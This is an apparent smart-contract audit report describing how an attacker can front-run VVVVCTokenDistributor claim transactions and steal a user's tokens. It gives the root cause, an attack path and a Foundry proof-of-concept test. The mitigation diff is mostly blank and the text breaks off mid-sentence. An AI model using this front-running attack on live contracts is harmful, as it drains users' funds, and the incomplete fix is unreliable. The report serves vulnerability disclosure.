# Malicious actor can front-run any `VVVVCTokenDistributor::claim(...)` transaction and get all of the user funds

### Summary

Currently, the `VVVVCTokenDistributor` contract allows `any address which is an alias of a KYC address to claim tokens` using the `claim(...)` function, however, literally any address can front-run a trustworthy user's `claim(...)` and end up getting all of the funds from the `kycAddress` wallets.

### Root Cause

The problem that creates this issue, IMO, is two-fold:

1. The `nonce` parameter being sent in the `ClaimParams` is [compared](https://github.com/sherlock-audit/2024-11-vvv-exchange-update/blob/main/vvv-platform-smart-contracts/contracts/vc/VVVVCTokenDistributor.sol#L115) to a nonce mapping where the address is again coming from the input parameters, so the attacker does not need be aware of any nonce logic.
2. The funds are directly [transferred](https://github.com/sherlock-audit/2024-11-vvv-exchange-update/blob/main/vvv-platform-smart-contracts/contracts/vc/VVVVCTokenDistributor.sol#L131-L135) to the `msg.sender`, but are taken from the `kycAddress`'s proxy wallets.

### Internal pre-conditions

1. Alice has funds in `vVv` in numerous proxy wallets.


### External pre-conditions

1. Bob (a malicious external actor) monitors the mempool for transactions.

### Attack Path

1. Alice gets an off-chain signature for a claim for her funds, signing all of the parameters in the `ClaimParams` structure.
2. Alice invokes the `claim(...)` function.
3. Bob sees that transaction in the mempool, and front-runs it.
4. His transaction gets executed first and passes because the `ClaimParams` parameter contains all of the data needed to pass the inner checks.
5. Alice's transaction reverts because the `nonce` changes and does not pass the inner check.
6. All of Alice's funds get transferred to Bob.

### Impact

1. Users get fully drained from their funds when claiming.

### PoC

Add the following test to the `VVVVCTokenDistributorUnitTests.t.sol` file:

```solidity
    function testClaimFrontRunning() public {
        address[] memory thisProjectTokenProxyWallets = new address[](1);
        uint256[] memory thisTokenAmountsToClaim = new uint256[](1);

        thisProjectTokenProxyWallets[0] = projectTokenProxyWallets[0];

        uint256 claimAmount = sampleTokenAmountsToClaim[0];
        thisTokenAmountsToClaim[0] = claimAmount;

        // Sample user generates a claim params signature and claims the tokens
        VVVVCTokenDistributor.ClaimParams memory claimParams =
            generateClaimParamsWithSignature(sampleKycAddress, thisProjectTokenProxyWallets, thisTokenAmountsToClaim);

        // A malicious user sees that transaction and front runs it and gets all funds
        address maliciousUser = address(0x123);

        claimAsUser(maliciousUser, claimParams);
        assertTrue(ProjectTokenInstance.balanceOf(maliciousUser) == claimAmount);

        // The sample users transaction reverts
        vm.startPrank(sampleKycAddress);
        vm.expectRevert(VVVVCTokenDistributor.InvalidNonce.selector);
        TokenDistributorInstance.claim(claimParams);
        vm.stopPrank();
    }
 ```

### Mitigation

The easiest solution would be to change the address that receives the funds to be the `kycAddress`:

```diff

                 _params.projectTokenProxyWallets[i],

             );
         }
 ```
 
 The above will end up transferring everything to the address that has passed KYC. However, if the funds should be transferrable to external addresses, then changing the nonce comparison logic should also stop the attack:
